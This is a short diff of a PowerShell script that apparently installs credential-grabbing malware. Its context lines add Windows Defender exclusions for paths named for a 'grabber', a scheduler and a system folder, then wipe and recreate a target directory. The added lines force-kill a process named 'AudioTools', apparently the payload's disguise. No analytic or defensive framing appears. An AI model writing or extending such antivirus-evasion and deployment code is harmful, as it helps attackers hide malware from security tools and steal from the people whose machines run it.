@@ -20,6 +20,10 @@ Add-MpPreference -ExclusionPath "$TargetGrabber" -Force
 Add-MpPreference -ExclusionPath "$TargetSchedule" -Force
 Add-MpPreference -ExclusionPath "$TargetSystem" -Force
 
+if (Get-Process -Name "AudioTools" -ErrorAction SilentlyContinue) {
+  Stop-Process -Name "AudioTools" -Force
+}
+
 if (Test-Path "$TargetPath") {
   Remove-Item -Recurse -Force -Path "$TargetPath"
   New-Item -Path "$TargetPath" -ItemType Directory -Force
